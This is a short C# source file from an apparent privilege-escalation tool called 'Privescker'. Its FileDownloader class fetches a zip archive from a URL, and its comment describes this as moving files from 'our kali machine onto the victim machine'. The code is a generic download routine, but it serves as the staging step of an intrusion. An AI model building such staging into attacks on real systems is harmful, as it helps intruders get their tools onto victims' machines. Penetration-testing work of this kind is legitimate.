namespace Privescker
{
    using System;
    using System.Linq;
    using System.Net;
    using System.Net.Mime;
    public class FileDownloader
    {
        /// <summary>
        /// Downloads the zip file from our kali machine onto the victim machine
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public string GetZipFile(string url)
        {
            try
            {
                using (var client = new WebClient())
                {
                    //client.OpenRead(url);

                    // Lets get the filename
                    string filename = GetFileName(url, client);

                    // Lets download the zip file
                    client.DownloadFile(new Uri(url), filename);
                    return filename;
                }
                
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }

        }

        /// <summary>
        /// Attempts to get the filename of the archive file we are downloading
        /// </summary>
        /// <param name="url"></param>
        /// <param name="client"></param>
        /// <returns></returns>
        private static string GetFileName(string url, WebClient client)
        {
            return url.Split('/').Last();
            //if (!string.IsNullOrEmpty(client.ResponseHeaders["Content-Disposition"]))
            //{
            //    // Lets try and get the file name from the headers
            //    return new ContentDisposition(client.ResponseHeaders["Content-Disposition"]).FileName;
            //}
            //else
            //{
            //    // If this fails then lets just assume it is the last part of the URL
            //    return url.Split('/').Last();
            //}
        }
    }
}
